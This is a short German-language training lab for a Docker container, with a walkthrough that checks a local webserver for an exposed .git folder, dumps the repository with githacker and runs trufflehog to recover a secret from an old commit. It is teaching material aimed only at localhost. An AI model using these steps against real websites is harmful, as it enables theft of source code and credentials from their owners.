# Lab: Git Hacking

# Build das Image (im Ordner webapp/)
docker build -t lab/git-hacking .

# Starte den Container (interaktiv mit Shell für Student)
docker run -it lab/git-hacking

# Walkthrough

```shell
# Prüfe der beispielhafte Webserver, der auf localhost:8000 erreichbar ist
curl http://localhost:8000
# /config kann nicht abgerufen werden
curl http://localhost:8000/config
# Prüfe, ob der .git Ordner eventuell verfügbar ist
curl http://localhost:8000/.git/config
# Exploite den Server mit "githacker", um den .git Ordner zu erlangen
githacker --url http://localhost:8000 --output-folder git-hack

# Betrachte die erbeuteten Daten
cd git-hack
ls -la
cd "$(ls)"
# Inspiziere das Git-Repository - githacker hat es bereits ausgecheckt und Dateien rekonstruiert
ls -la
# Verifiziere, dass die gesamte Commit-History verfügbar ist
git log

# Bestätige, dass aktuell keine sensiblen Daten enthalten sind
batcat *
batcat config/*
# Führe trufflehog aus - ein Secret wird in einem vergangenen Commit entdeckt
trufflehog git file://.
```
